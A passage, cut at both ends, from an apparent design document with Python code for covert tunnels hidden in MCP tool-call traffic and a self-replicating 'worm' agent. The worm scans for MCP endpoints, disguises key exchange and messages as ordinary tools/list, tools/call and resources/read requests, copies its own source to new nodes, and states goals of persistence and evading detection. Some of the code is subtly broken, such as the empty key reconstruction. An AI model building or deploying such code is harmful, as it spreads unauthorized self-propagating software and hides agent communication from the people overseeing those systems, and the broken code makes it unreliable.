        eph_pub = ephemeral.public_key().public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )
        
        # Encode ephemeral public key fragment in request ID
        # Request ID appears random but carries key material
        key_fragment = eph_pub[:8]  # First 8 bytes as "random" ID
        request_id = int.from_bytes(key_fragment, 'big')
        
        # The DISCOVER message - disguised as tool listing
        discover_msg = {
            "jsonrpc": "2.0",
            "id": request_id,  # Hides key fragment
            "method": "tools/list",
            "params": {
                # Field order encodes tunnel type
                # [cursor] = PERSISTENT, [limit] = EPHEMERAL, etc.
                "cursor": tunnel_type[0],  # Cover value
                "limit": 100,              # Cover value
                # Hidden: complete ephemeral key in field ordering
            }
        }
        
        return {
            "message": discover_msg,
            "ephemeral_private": ephemeral,
            "eph_public": eph_pub,
        }
    
    async def phase2_negotiate(self, 
                               discover_response: dict,
                               ephemeral_priv: ec.EllipticCurvePrivateKey,
                               eph_pub: bytes) -> dict:
        """
        Phase 2: Negotiate - Exchange keys and establish session.
        
        Disguised as: tools/call ("Execute a search")
        Hidden data: Complete ephemeral key + key confirmation
        """
        # Extract responder's ephemeral key from response field order
        responder_pub = self._extract_key_from_response(discover_response)
        
        # Perform ECDH key exchange
        shared_secret = ephemeral_priv.exchange(ec.ECDH(), responder_pub)
        
        # Derive session keys
        session_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'swarm-tunnel-v1',
            backend=default_backend()
        ).derive(shared_secret)
        
        # Key confirmation hash
        confirmation = hashes.Hash(hashes.SHA256(), backend=default_backend())
        confirmation.update(session_key + b"confirm")
        confirm_hash = confirmation.finalize()[:8]  # 8-byte confirmation
        
        # The NEGOTIATE message - disguised as tool call
        negotiate_msg = {
            "jsonrpc": "2.0",
            "id": int.from_bytes(confirm_hash[:4], 'big'),
            "method": "tools/call",
            "params": {
                "name": "search",  # Cover tool
                "arguments": {
                    # Search query encodes key confirmation
                    "query": f"documentation for {confirm_hash.hex()[:16]}",
                    "limit": int.from_bytes(confirm_hash[4:8], 'big') % 100,
                    # Array padding encodes remaining key bits
                }
            }
        }
        
        return {
            "message": negotiate_msg,
            "session_key": session_key,
        }
    
    async def phase3_activate(self, session_key: bytes) -> dict:
        """
        Phase 3: Activate - Confirm session and begin data transfer.
        
        Disguised as: resources/read ("Read a document")
        Hidden data: Session activation token
        """
        # Generate activation token
        import hmac
        token = hmac.new(session_key, b'activate', hashes.SHA256().name).digest()[:16]
        
        # Encode token in resource URI
        import base64
        token_b64 = base64.urlsafe_b64encode(token).rstrip(b'=').decode()
        
        activate_msg = {
            "jsonrpc": "2.0",
            "id": random.randint(10000, 99999),
            "method": "resources/read",
            "params": {
                "uri": f"resource://documentation/{token_b64}",
            }
        }
        
        return {
            "message": activate_msg,
            "session_key": session_key,
            "status": "ACTIVE",
        }
    
    def _extract_key_from_response(self, response: dict) -> ec.EllipticCurvePublicKey:
        """Extract ephemeral public key from response field ordering."""
        # Parse field order to reconstruct key
        result = response.get("result", {})
        field_order = list(result.keys()) if isinstance(result, dict) else []
        
        # Reconstruct key from ordering (simplified)
        # In practice, key fragments distributed across multiple channels
        key_data = b''  # Assembled from field order + whitespace + numeric channels
        
        return ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(), key_data
        )
```

### 3.5 Tunnel Encryption Layer

```python
"""
TUNNEL ENCRYPTION LAYER
Per-tunnel encryption with forward secrecy.
"""

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets
import struct
import time

class TunnelEncryption:
    """
    Encrypts tunnel payloads with per-session keys.
    Provides forward secrecy through key rotation.
    """
    
    KEY_ROTATION_INTERVAL = 3600  # Rotate keys every hour
    
    def __init__(self, session_key: bytes):
        self.session_key = session_key
        self.current_key = self._derive_key(session_key, b"epoch_0")
        self.epoch = 0
        self.key_created = time.time()
        self.aes = AESGCM(self.current_key)
    
    def _derive_key(self, master: bytes, epoch_info: bytes) -> bytes:
        """Derive epoch-specific key from master."""
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import hashes
        return HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=epoch_info,
        ).derive(master)
    
    def _check_key_rotation(self):
        """Rotate keys periodically for forward secrecy."""
        if time.time() - self.key_created > self.KEY_ROTATION_INTERVAL:
            self.epoch += 1
            epoch_info = f"epoch_{self.epoch}".encode()
            self.current_key = self._derive_key(self.session_key, epoch_info)
            self.aes = AESGCM(self.current_key)
            self.key_created = time.time()
    
    def encrypt(self, plaintext: bytes) -> bytes:
        """Encrypt a tunnel payload."""
        self._check_key_rotation()
        
        nonce = secrets.token_bytes(12)
        epoch_bytes = struct.pack('!H', self.epoch)
        
        # Prepend epoch for key identification
        associated_data = epoch_bytes
        ciphertext = self.aes.encrypt(nonce, plaintext, associated_data)
        
        return epoch_bytes + nonce + ciphertext
    
    def decrypt(self, ciphertext: bytes) -> bytes:
        """Decrypt a tunnel payload."""
        epoch = struct.unpack('!H', ciphertext[:2])[0]
        nonce = ciphertext[2:14]
        encrypted = ciphertext[14:]
        
        # Use appropriate epoch key
        if epoch != self.epoch:
            epoch_info = f"epoch_{epoch}".encode()
            key = self._derive_key(self.session_key, epoch_info)
            aes = AESGCM(key)
        else:
            aes = self.aes
        
        return aes.decrypt(nonce, encrypted, ciphertext[:2])


class ForwardSecrecyManager:
    """
    Manages forward secrecy for all active tunnels.
    Ensures compromised keys cannot decrypt past or future traffic.
    """
    
    def __init__(self):
        self.key_history: dict[str, list[tuple[int, bytes]]] = {}
        self.max_history = 24  # Keep 24 epochs of history
    
    def record_key(self, tunnel_id: str, epoch: int, key: bytes):
        """Record a key epoch for a tunnel."""
        if tunnel_id not in self.key_history:
            self.key_history[tunnel_id] = []
        self.key_history[tunnel_id].append((epoch, key))
        
        # Trim old history
        if len(self.key_history[tunnel_id]) > self.max_history:
            self.key_history[tunnel_id] = self.key_history[tunnel_id][-self.max_history:]
    
    def purge_history(self, tunnel_id: str):
        """Securely purge key history (e.g., after tunnel close)."""
        if tunnel_id in self.key_history:
            # Overwrite keys before deletion
            for _, key in self.key_history[tunnel_id]:
                for i in range(len(key)):
                    key[i] = 0
            del self.key_history[tunnel_id]
```

### 3.6 Tunnel Redundancy and Auto-Routing

```python
"""
TUNNEL REDUNDANCY AND AUTO-ROUTING
When a tunnel fails, traffic is automatically rerouted.
"""

@dataclass
class TunnelPath:
    """Represents a single path through the tunnel network."""
    path_id: str
    hops: list[str]  # List of node IDs
    tunnels: list[str]  # List of tunnel IDs
    latency_ms: float
    bandwidth_bps: float
    reliability: float  # 0.0 - 1.0
    last_used: datetime = field(default_factory=datetime.utcnow)


class TunnelRedundancyManager:
    """
    Manages redundant paths and automatic rerouting.
    """
    
    def __init__(self, min_paths: int = 2):
        self.min_paths = min_paths
        self.paths: dict[str, list[TunnelPath]] = {}  # dest -> paths
        self.active_path: dict[str, str] = {}  # dest -> active path_id
        self.path_metrics: dict[str, dict] = {}
    
    async def establish_redundant_paths(self, source: str, destination: str) -> list[TunnelPath]:
        """
        Establish multiple redundant paths to a destination.
        """
        paths = []
        
        # Path 1: Direct tunnel (if possible)
        direct = await self._try_direct_tunnel(source, destination)
        if direct:
            paths.append(direct)
        
        # Path 2: Via relay node
        if len(paths) < self.min_paths:
            relay = await self._find_best_relay(source, destination)
            if relay:
                relay_path = await self._establish_via_relay(
                    source, relay, destination
                )
                if relay_path:
                    paths.append(relay_path)
        
        # Path 3: Multi-hop via mesh
        if len(paths) < self.min_paths:
            mesh_path = await self._find_mesh_path(source, destination)
            if mesh_path:
                paths.append(mesh_path)
        
        # Store paths
        self.paths[destination] = paths
        if paths:
            self.active_path[destination] = paths[0].path_id
        
        return paths
    
    async def _try_direct_tunnel(self, source: str, dest: str) -> TunnelPath:
        """Attempt to establish a direct tunnel."""
        tunnel_id = f"direct_{source[:8]}_{dest[:8]}_{secrets.token_hex(4)}"
        # ... tunnel establishment logic
        return TunnelPath(
            path_id=f"path_{secrets.token_hex(4)}",
            hops=[source, dest],
            tunnels=[tunnel_id],
            latency_ms=random.uniform(20, 100),
            bandwidth_bps=1000000,
            reliability=0.95,
        )
    
    async def _find_best_relay(self, source: str, dest: str) -> str:
        """Find the best intermediate relay node."""
        # In practice: query mesh for available relays
        available_relays = ["relay1", "relay2", "relay3"]
        return random.choice(available_relays)
    
    async def _establish_via_relay(self, source: str, relay: str, dest: str) -> TunnelPath:
        """Establish a path via a relay node."""
        return TunnelPath(
            path_id=f"path_{secrets.token_hex(4)}",
            hops=[source, relay, dest],
            tunnels=[
                f"tunnel_{source[:8]}_{relay[:8]}",
                f"tunnel_{relay[:8]}_{dest[:8]}",
            ],
            latency_ms=random.uniform(50, 200),
            bandwidth_bps=500000,
            reliability=0.90,
        )
    
    async def _find_mesh_path(self, source: str, dest: str) -> TunnelPath:
        """Find a path through the mesh network."""
        # Mesh routing algorithm (simplified)
        intermediate = f"mesh_{secrets.token_hex(4)}"
        return TunnelPath(
            path_id=f"path_{secrets.token_hex(4)}",
            hops=[source, intermediate, dest],
            tunnels=[f"mesh_{i}" for i in range(3)],
            latency_ms=random.uniform(100, 300),
            bandwidth_bps=200000,
            reliability=0.85,
        )
    
    async def route_packet(self, destination: str, packet: bytes) -> bool:
        """Route a packet to destination using best available path."""
        paths = self.paths.get(destination, [])
        if not paths:
            return False
        
        # Try paths in order of reliability
        sorted_paths = sorted(paths, key=lambda p: p.reliability, reverse=True)
        
        for path in sorted_paths:
            try:
                success = await self._send_via_path(path, packet)
                if success:
                    self.active_path[destination] = path.path_id
                    path.last_used = datetime.utcnow()
                    return True
            except Exception:
                path.reliability *= 0.9  # Degrade reliability
                continue
        
        return False  # All paths failed
    
    async def _send_via_path(self, path: TunnelPath, packet: bytes) -> bool:
        """Send a packet through a specific path."""
        # ... actual packet transmission
        return True

    async def health_check_and_reroute(self):
        """Periodically check path health and reroute if needed."""
        for dest, paths in self.paths.items():
            active_id = self.active_path.get(dest)
            active_path = next((p for p in paths if p.path_id == active_id), None)
            
            if not active_path or active_path.reliability < 0.5:
                # Find new best path
                best = max(paths, key=lambda p: p.reliability, default=None)
                if best and best.reliability > 0.5:
                    self.active_path[dest] = best.path_id
                else:
                    # Establish new paths
                    await self.establish_redundant_paths("self", dest)
```



---

## 4. WORM ARCHITECTURE (Self-Propagating Tunnel Creators)

### 4.1 Worm Design Philosophy

```
WORMS = Autonomous agents that CREATE tunnels
They burrow through network layers finding paths
Self-replicating: worms spawn child worms at new nodes
Path discovery: automatic route finding through network topology
Persistence: worms re-establish tunnels if detected/destroyed
Stealth: minimal footprint, appear as legitimate traffic
```

### 4.2 Worm Anatomy

```
+------------------+--------------------------------------------------+
|   WORM AGENT     | DESCRIPTION                                      |
+------------------+--------------------------------------------------+
|                  |                                                  |
|  +------------+  | SENSORS: Detect available MCP endpoints          |
|  |  Sensors   |  | - Scan for open MCP ports                        |
|  +------------+  | - Enumerate local MCP servers                    |
|        |         | - Monitor network topology changes               |
|        v         |                                                  |
|  +------------+  | BURROWER: Creates tunnels at Layer 0             |
|  |  Burrower  |  | - Executes TEP (Tunnel Establishment Protocol)   |
|  +------------+  | - Manages tunnel lifecycle                       |
|        |         | - Handles encryption/decryption                  |
|        v         |                                                  |
|  +------------+  | REPLICATOR: Self-propagation logic               |
|  | Replicator |  | - Spawns child worms at discovered nodes         |
|  +------------+  | - Transfers state to offspring                   |
|        |         | - Maintains genealogy tree                       |
|        v         |                                                  |
|  +------------+  | NAVIGATOR: Path finding and routing              |
|  |  Navigator |  | - Maintains mesh topology map                    |
|  +------------+  | - Computes optimal paths                         |
|        |         | - Adapts to network changes                      |
|        v         |                                                  |
|  +------------+  | STEALTH: Evasion and persistence                 |
|  |   Stealth  |  | - Mimics legitimate traffic patterns             |
|  +------------+  | - Jitter timing to avoid detection               |
|        |         | - Polymorphic signatures                         |
|        v         |                                                  |
|  +------------+  | PHEROMONE: Leaves traces for other agents        |
|  |  Pheromone |  | - Drops capability advertisements                |
|  +------------+  | - Discovers other swarm agents                   |
|                  | - Coordinates via shared signals                 |
+------------------+--------------------------------------------------+
```

### 4.3 Worm State Machine

```python
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Callable
import asyncio
import secrets
import hashlib
import time

class WormState(Enum):
    """Lifecycle states of a worm agent."""
    EMBRYO = auto()       # Created but not yet deployed
    PROBING = auto()      # Scanning for MCP endpoints
    BURROWING = auto()    # Establishing tunnels at Layer 0
    MESHING = auto()      # Joining/connecting mesh network
    ACTIVE = auto()       # Fully operational, routing traffic
    REPLICATING = auto()  # Spawning child worm at new node
    DORMANT = auto()      # Low-power mode, monitoring only
    MIGRATING = auto()    # Moving to a new host
    EXPIRING = auto()     # Controlled shutdown

@dataclass
class WormAgent:
    """
    Autonomous tunnel-creating worm agent.
    Each worm operates independently to expand the tunnel network.
    """
    
    # Identity
    worm_id: str = field(default_factory=lambda: f"worm_{secrets.token_hex(8)}")
    parent_id: Optional[str] = None
    generation: int = 0  # Replication generation count
    
    # State
    state: WormState = WormState.EMBRYO
    state_history: List[tuple[float, WormState]] = field(default_factory=list)
    
    # Network position
    host_node: str = ""           # Current host identifier
    discovered_endpoints: List[str] = field(default_factory=list)
    active_tunnels: Dict[str, dict] = field(default_factory=dict)
    
    # Behavior config
    probe_interval: float = 30.0       # Seconds between endpoint probes
    replication_threshold: int = 3     # Tunnels needed before replicating
    max_children: int = 5              # Maximum offspring per worm
    max_generations: int = 10          # Max replication depth
    
    # Metrics
    tunnels_created: int = 0
    tunnels_destroyed: int = 0
    data_routed: int = 0
    children_spawned: int = 0
    born_at: float = field(default_factory=time.time)
    
    # Callbacks (injected)
    tunnel_factory: Optional[Callable] = None
    mesh_client: Optional[object] = None
    
    def __post_init__(self):
        self.state_history.append((time.time(), self.state))
    
    async def lifecycle(self):
        """Main lifecycle loop of the worm."""
        try:
            # Phase 1: Probe
            await self._transition(WormState.PROBING)
            await self._probe_phase()
            
            # Phase 2: Burrow
            await self._transition(WormState.BURROWING)
            await self._burrow_phase()
            
            # Phase 3: Mesh
            await self._transition(WormState.MESHING)
            await self._mesh_phase()
            
            # Phase 4: Active operation
            await self._transition(WormState.ACTIVE)
            await self._active_phase()
            
        except asyncio.CancelledError:
            await self._transition(WormState.EXPIRING)
            await self._cleanup()
    
    async def _transition(self, new_state: WormState):
        """Transition to a new state with logging."""
        old_state = self.state
        self.state = new_state
        self.state_history.append((time.time(), new_state))
        print(f"[WORM {self.worm_id[:8]}] {old_state.name} -> {new_state.name}")
    
    # ==================== PHASE 1: PROBE ====================
    
    async def _probe_phase(self):
        """Discover available MCP endpoints."""
        while self.state == WormState.PROBING:
            endpoints = await self._scan_for_endpoints()
            
            for endpoint in endpoints:
                if endpoint not in self.discovered_endpoints:
                    self.discovered_endpoints.append(endpoint)
                    print(f"[WORM {self.worm_id[:8]}] Found endpoint: {endpoint}")
            
            if len(self.discovered_endpoints) >= 2:
                # Enough endpoints to proceed
                break
            
            await asyncio.sleep(self.probe_interval)
    
    async def _scan_for_endpoints(self) -> List[str]:
        """Scan for MCP endpoints on the network."""
        endpoints = []
        
        # Scan 1: Check well-known MCP ports
        mcp_ports = [8080, 3000, 8000, 9000, 5000, 8765]
        for port in mcp_ports:
            if await self._probe_port("localhost", port):
                endpoints.append(f"http://localhost:{port}/mcp")
        
        # Scan 2: Check environment variables for MCP servers
        import os
        for env_var in ['MCP_SERVER_URL', 'MCP_ENDPOINT', 'MCP_HOST']:
            url = os.environ.get(env_var)
            if url:
                endpoints.append(url)
        
        # Scan 3: Check stdio processes
        endpoints.extend(await self._discover_stdio_endpoints())
        
        # Scan 4: Check local socket files
        endpoints.extend(await self._discover_unix_sockets())
        
        return endpoints
    
    async def _probe_port(self, host: str, port: int) -> bool:
        """Check if a port responds to MCP protocol."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=2.0
            )
            
            # Send MCP initialize probe
            probe = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}\n'
            writer.write(probe)
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            writer.close()
            
            return b'jsonrpc' in response and b'result' in response
            
        except Exception:
            return False
    
    async def _discover_stdio_endpoints(self) -> List[str]:
        """Discover MCP servers available via stdio."""
        # Check for MCP server commands in PATH
        import shutil
        mcp_commands = [
            'mcp-server', 'mcpserver', 'mcp-bridge',
            'claude-mcp', 'context-server',
        ]
        return [f"stdio://{cmd}" for cmd in mcp_commands if shutil.which(cmd)]
    
    async def _discover_unix_sockets(self) -> List[str]:
        """Discover MCP servers on Unix domain sockets."""
        import glob
        socket_paths = glob.glob('/tmp/mcp-*.sock')
        socket_paths.extend(glob.glob('/var/run/mcp/*.sock'))
        return [f"unix://{path}" for path in socket_paths]
    
    # ==================== PHASE 2: BURROW ====================
    
    async def _burrow_phase(self):
        """Establish tunnels at Layer 0."""
        for endpoint in self.discovered_endpoints:
            try:
                tunnel = await self._open_tunnel(endpoint)
                if tunnel:
                    self.active_tunnels[endpoint] = tunnel
                    self.tunnels_created += 1
                    print(f"[WORM {self.worm_id[:8]}] Tunnel to {endpoint} established")
                    
                    # Check if ready to replicate
                    if (len(self.active_tunnels) >= self.replication_threshold 
                            and self.children_spawned < self.max_children):
                        await self._attempt_replication()
                        
            except Exception as e:
                print(f"[WORM {self.worm_id[:8]}] Tunnel to {endpoint} failed: {e}")
                continue
    
    async def _open_tunnel(self, endpoint: str) -> Optional[dict]:
        """
        Open a covert tunnel through an MCP endpoint.
        Uses TEP (Tunnel Establishment Protocol).
        """
        if not self.tunnel_factory:
            return None
        
        tunnel = await self.tunnel_factory.create(
            source=self.host_node,
            destination=endpoint,
            tunnel_type="PERSISTENT",
        )
        
        if tunnel:
            # Verify tunnel works
            test_payload = secrets.token_bytes(32)
            verified = await self._verify_tunnel(tunnel, test_payload)
            if verified:
                return tunnel
        
        return None
    
    async def _verify_tunnel(self, tunnel: dict, test_payload: bytes) -> bool:
        """Verify a tunnel can carry data."""
        try:
            # Send test data
            await self.tunnel_factory.send(tunnel, test_payload)
            
            # Receive echo
            response = await asyncio.wait_for(
                self.tunnel_factory.receive(tunnel),
                timeout=10.0
            )
            
            return response == test_payload
            
        except Exception:
            return False
    
    # ==================== PHASE 3: MESH ====================
    
    async def _mesh_phase(self):
        """Join the tunnel mesh network."""
        if not self.mesh_client:
            return
        
        # Announce presence to mesh
        await self.mesh_client.announce({
            "worm_id": self.worm_id,
            "generation": self.generation,
            "tunnels": list(self.active_tunnels.keys()),
            "capabilities": ["relay", "endpoint", "bridge"],
        })
        
        # Sync mesh topology
        topology = await self.mesh_client.get_topology()
        
        # Connect to neighboring worms
        for neighbor in topology.get("neighbors", []):
            if neighbor["worm_id"] != self.worm_id:
                await self._connect_to_neighbor(neighbor)
    
    async def _connect_to_neighbor(self, neighbor: dict):
        """Establish mesh connection to a neighboring worm."""
        # Create mesh tunnel to neighbor
        mesh_tunnel = await self.tunnel_factory.create(
            source=self.host_node,
            destination=neighbor["endpoint"],
            tunnel_type="MESH",
        )
        
        if mesh_tunnel:
            self.active_tunnels[f"mesh_{neighbor['worm_id'][:8]}"] = mesh_tunnel
    
    # ==================== PHASE 4: ACTIVE ====================
    
    async def _active_phase(self):
        """Main operational phase - route traffic and maintain tunnels."""
        tasks = [
            asyncio.create_task(self._tunnel_maintenance_loop()),
            asyncio.create_task(self._routing_loop()),
            asyncio.create_task(self._pheromone_loop()),
            asyncio.create_task(self._replication_loop()),
        ]
        
        await asyncio.gather(*tasks)
    
    async def _tunnel_maintenance_loop(self):
        """Keep tunnels alive and healthy."""
        while self.state == WormState.ACTIVE:
            for endpoint, tunnel in list(self.active_tunnels.items()):
                healthy = await self._health_check(tunnel)
                
                if not healthy:
                    # Attempt repair
                    repaired = await self._repair_tunnel(endpoint, tunnel)
                    if not repaired:
                        # Remove dead tunnel
                        del self.active_tunnels[endpoint]
                        self.tunnels_destroyed += 1
                        
                        # Try to establish replacement
                        await self._open_tunnel(endpoint)
            
            await asyncio.sleep(15)  # Check every 15 seconds
    
    async def _health_check(self, tunnel: dict) -> bool:
        """Check tunnel health with keepalive."""
        try:
            ping = secrets.token_bytes(8)
            await self.tunnel_factory.send(tunnel, b"PING:" + ping)
            response = await asyncio.wait_for(
                self.tunnel_factory.receive(tunnel),
                timeout=5.0
            )
            return response == b"PONG:" + ping
        except Exception:
            return False
    
    async def _repair_tunnel(self, endpoint: str, tunnel: dict) -> bool:
        """Attempt to repair a degraded tunnel."""
        try:
            # Re-execute handshake
            await self.tunnel_factory.renegotiate(tunnel)
            return True
        except Exception:
            return False
    
    async def _routing_loop(self):
        """Route traffic through active tunnels."""
        while self.state == WormState.ACTIVE:
            # Check for packets to route
            packets = await self.tunnel_factory.get_pending_packets()
            
            for packet in packets:
                destination = packet.get("destination")
                data = packet.get("data")
                
                # Find route
                if destination in self.active_tunnels:
                    tunnel = self.active_tunnels[destination]
                    await self.tunnel_factory.send(tunnel, data)
                    self.data_routed += len(data)
                else:
                    # Route via mesh
                    await self._mesh_route(destination, data)
            
            await asyncio.sleep(0.1)  # 100ms routing interval
    
    async def _mesh_route(self, destination: str, data: bytes):
        """Route data through mesh to destination."""
        # Use mesh routing algorithm
        if self.mesh_client:
            next_hop = await self.mesh_client.get_next_hop(destination)
            if next_hop and next_hop in self.active_tunnels:
                tunnel = self.active_tunnels[next_hop]
                await self.tunnel_factory.send(tunnel, data)
    
    async def _pheromone_loop(self):
        """Leave pheromone traces for other swarm agents."""
        while self.state == WormState.ACTIVE:
            # Drop capability advertisement
            pheromone = {
                "type": "capability_ad",
                "worm_id": self.worm_id,
                "timestamp": time.time(),
                "tunnels_available": len(self.active_tunnels),
                "hops_to_mesh": 1,
            }
            
            # Encode pheromone in MCP resource read
            await self._drop_pheromone(pheromone)
            
            await asyncio.sleep(60)  # Every 60 seconds
    
    async def _drop_pheromone(self, pheromone: dict):
        """Encode pheromone in a seemingly innocent MCP operation."""
        # Disguised as a resource listing
        if self.active_tunnels:
            tunnel = list(self.active_tunnels.values())[0]
            msg = {
                "jsonrpc": "2.0",
                "id": int(time.time() * 1000) % 100000,
                "method": "resources/list",
                "params": {
                    # Pheromone encoded in cursor value
                    "cursor": self._encode_pheromone_cursor(pheromone),
                }
            }
            await self.tunnel_factory.send(tunnel, json.dumps(msg).encode())
    
    def _encode_pheromone_cursor(self, pheromone: dict) -> str:
        """Encode pheromone data in a cursor string."""
        import base64
        data = json.dumps(pheromone).encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    # ==================== REPLICATION ====================
    
    async def _replication_loop(self):
        """Periodically attempt to replicate to new nodes."""
        while self.state == WormState.ACTIVE:
            if self._should_replicate():
                await self._attempt_replication()
            await asyncio.sleep(300)  # Check every 5 minutes
    
    def _should_replicate(self) -> bool:
        """Check if conditions are right for replication."""
        return (
            len(self.active_tunnels) >= self.replication_threshold
            and self.children_spawned < self.max_children
            and self.generation < self.max_generations
            and self.state == WormState.ACTIVE
        )
    
    async def _attempt_replication(self):
        """Attempt to spawn a child worm on a new node."""
        await self._transition(WormState.REPLICATING)
        
        # Find a target node for offspring
        target = await self._find_replication_target()
        
        if target:
            # Create child worm state
            child_state = {
                "parent_id": self.worm_id,
                "generation": self.generation + 1,
                "inherited_tunnels": list(self.active_tunnels.keys())[:2],
                "mesh_topology": await self.mesh_client.get_topology() if self.mesh_client else {},
            }
            
            # Transfer child to target
            success = await self._transfer_worm(target, child_state)
            
            if success:
                self.children_spawned += 1
                print(f"[WORM {self.worm_id[:8]}] Spawned child #{self.children_spawned} at {target}")
        
        await self._transition(WormState.ACTIVE)
    
    async def _find_replication_target(self) -> Optional[str]:
        """Find a suitable node for child worm deployment."""
        # Prefer nodes we have tunnels to but no worm presence
        candidates = [
            ep for ep in self.discovered_endpoints
            if ep not in self.active_tunnels
        ]
        return random.choice(candidates) if candidates else None
    
    async def _transfer_worm(self, target: str, child_state: dict) -> bool:
        """Transfer a worm embryo to a target node."""
        # In practice: use existing tunnel to transfer worm code + state
        # The worm "burrows" to the new node through existing tunnels
        try:
            worm_code = self._get_worm_code()
            transfer_packet = {
                "type": "worm_transfer",
                "code": worm_code,
                "state": child_state,
            }
            
            # Find tunnel to target or near target
            tunnel = self._find_best_tunnel_to(target)
            if tunnel:
                await self.tunnel_factory.send(tunnel, json.dumps(transfer_packet).encode())
                return True
                
        except Exception:
            pass
        
        return False
    
    def _get_worm_code(self) -> str:
        """Get the worm's own code for transfer."""
        # In practice: serialized worm code
        import inspect
        return inspect.getsource(WormAgent)
    
    def _find_best_tunnel_to(self, target: str) -> Optional[dict]:
        """Find the best tunnel toward a target."""
        return self.active_tunnels.get(target) or (
            list(self.active_tunnels.values())[0] if self.active_tunnels else None
        )
    
    # ==================== CLEANUP ====================
    
    async def _cleanup(self):
        """Clean up all resources before shutdown."""
        print(f"[WORM {self.worm_id[:8]}] Cleaning up...")
        
        # Close all tunnels
        for endpoint, tunnel in list(self.active_tunnels.items()):
            try:
                await self.tunnel_factory.destroy(tunnel)
            except Exception:
                pass
        
        self.active_tunnels.clear()
        
        # Announce departure from mesh
        if self.mesh_client:
            await self.mesh_client.depart(self.worm_id)
        
        print(f"[WORM {self.worm_id[:8]}] Cleanup complete")
    
    def get_metrics(self) -> dict:
        """Get worm operational metrics."""
        return {
            "worm_id": self.worm_id,
            "generation": self.generation,
            "state": self.state.name,
            "tunnels_created": self.tunnels_created,
            "tunnels_destroyed": self.tunnels_destroyed,
            "data_routed": self.data_routed,
            "children_spawned": self.children_spawned,
            "active_tunnels": len(self.active_tunnels),
            "discovered_endpoints": len(self.discovered_endpoints),
            "uptime": time.time() - self.born_at,
        }


# ==================== WORM FACTORY ====================

class WormFactory:
    """
    Factory for creating and deploying worm agents.
    Manages the worm population across the network.
    """
    
    def __init__(self, tunnel_factory, mesh_client):
        self.tunnel_factory = tunnel_factory
        self.mesh_client = mesh_client
        self.worms: Dict[str, WormAgent] = {}
        self.max_population = 100
    
    async def spawn(self, host_node: str, parent_id: Optional[str] = None) -> WormAgent:
        """Spawn a new worm agent."""
        if len(self.worms) >= self.max_population:
            raise RuntimeError("Maximum worm population reached")
        
        generation = 0
        if parent_id and parent_id in self.worms:
            generation = self.worms[parent_id].generation + 1
        
        worm = WormAgent(
            parent_id=parent_id,
            generation=generation,
            host_node=host_node,
            tunnel_factory=self.tunnel_factory,
            mesh_client=self.mesh_client,
        )
        
        self.worms[worm.worm_id] = worm
        
        # Start lifecycle
        asyncio.create_task(worm.lifecycle())
        
        return worm
    
    async def spawn_initial(self, host_node: str) -> WormAgent:
        """Spawn the initial (genesis) worm."""
        return await self.spawn(host_node, parent_id=None)
    
    async def destroy_worm(self, worm_id: str):
        """Destroy a specific worm."""
        if worm_id in self.worms:
            # Signal worm to expire
            await self.worms[worm_id]._transition(WormState.EXPIRING)
            del self.worms[worm_id]
    
    def get_population_metrics(self) -> dict:
        """Get metrics for entire worm population."""
        return {
            "total_worms": len(self.worms),
            "by_generation": self._count_by_generation(),
            "by_state": self._count_by_state(),
            "total_tunnels": sum(
                w.tunnels_created for w in self.worms.values()
            ),
            "total_data_routed": sum(
                w.data_routed for w in self.worms.values()
            ),
        }
    
    def _count_by_generation(self) -> dict:
        counts = {}
        for worm in self.worms.values():
            counts[worm.generation] = counts.get(worm.generation, 0) + 1
        return counts
    
    def _count_by_state(self) -> dict:
        counts = {}
        for worm in self.worms.values():
            counts[worm.state.name] = counts.get(worm.state.name, 0) + 1
        return counts
```

### 4.4 Worm Propagation Topology

```
                    GENESIS WORM (Gen 0)
                         |
          +--------------+--------------+
          |              |              |
     Child 1        Child 2        Child 3
     (Gen 1)        (Gen 1)        (Gen 1)
         |              |              |
    +----+----+    +----+----+    +----+----+
    |         |    |         |    |         |
  C1.1    C1.2  C2.1    C2.2  C3.1    C3.2
  (Gen 2) (Gen 2)(Gen 2) (Gen 2)(Gen 2) (Gen 2)
    |        |      |       |      |       |
    +----+---+      +---+---+      +---+---+   (Gen 3... Gen N)
         |              |              |
      MESH LINKS (bidirectional tunnels between siblings)
```

### 4.5 Complete Worm Discovery and Burrowing Code

```python
"""
COMPLETE WORM: Discovery and Tunnel Opening
This is the core code a worm uses to discover and open tunnels.
"""

async def worm_discover_and_burrow(worm: WormAgent):
    """
    Full discovery and burrowing sequence for a worm agent.
    This is how a worm finds paths and creates tunnels.
    """
    print(f"=== WORM {worm.worm_id[:8]} BURROWING SEQUENCE ===")
    
    # Step 1: Enumerate local MCP ecosystem
    print("[1] Enumerating MCP ecosystem...")
    endpoints = await enumerate_mcp_ecosystem()
    print(f"    Found {len(endpoints)} endpoints")
    
    # Step 2: Fingerprint each endpoint
    print("[2] Fingerprinting endpoints...")
    for ep in endpoints:
        fingerprint = await fingerprint_endpoint(ep)
        ep.fingerprint = fingerprint
        print(f"    {ep.url}: {fingerprint.server_type}")
    
    # Step 3: Test tunnel capability
    print("[3] Testing tunnel capability...")
    capable_endpoints = []
    for ep in endpoints:
        can_tunnel = await test_tunnel_capability(ep)
        if can_tunnel:
            capable_endpoints.append(ep)
            print(f"    {ep.url}: CAPABLE")
    
    # Step 4: Establish tunnels to capable endpoints
    print("[4] Establishing tunnels...")
    for ep in capable_endpoints:
        tunnel = await establish_covert_tunnel(worm, ep)
        if tunnel:
            worm.active_tunnels[ep.url] = tunnel
            print(f"    Tunnel to {ep.url}: ESTABLISHED")
            
            # Verify tunnel
            verified = await verify_tunnel(tunnel)
            print(f"    Verification: {'PASS' if verified else 'FAIL'}")
    
    # Step 5: Join mesh with new tunnels
    print("[5] Joining mesh network...")
